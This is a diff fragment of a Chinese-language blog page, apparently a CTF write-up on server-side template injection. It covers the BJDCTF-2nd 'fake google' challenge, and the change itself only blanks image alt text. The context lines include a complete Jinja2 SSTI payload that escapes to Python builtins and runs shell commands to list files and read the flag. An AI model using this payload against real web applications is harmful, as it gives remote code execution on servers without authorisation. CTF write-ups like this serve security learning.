@@ -53,11 +53,11 @@
 <p>一个扫描服务器端模板注入漏洞的开源工具 ，需要自取</p>
 <p>附上OS文件目录的方法： <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">Python OS 文件/目录方法</a></p>
 <h3 id="BJDCTF-2nd—fake-google"><a href="#BJDCTF-2nd—fake-google" class="headerlink" title="BJDCTF-2nd—fake google"></a>BJDCTF-2nd—fake google</h3><p>界面：</p>
-<p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100426394.png" alt="image-20200324100426394"></p>
+<p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100426394.png" alt=""></p>
 <p>随便输入测试后得到一以下结果，推测是SSTI</p>
-<p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100451322.png" alt="image-20200324100451322"></p>
+<p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100451322.png" alt=""></p>
 <p>F12打开后发现提示果然是SSTI</p>
-<p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100534466.png" alt="image-20200324100534466"></p>
+<p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100534466.png" alt=""></p>
 <p>测试后发现啥都没过滤，于是直接上payload：</p>
 <p>payload1：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('cd ..;ls;cat flag').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
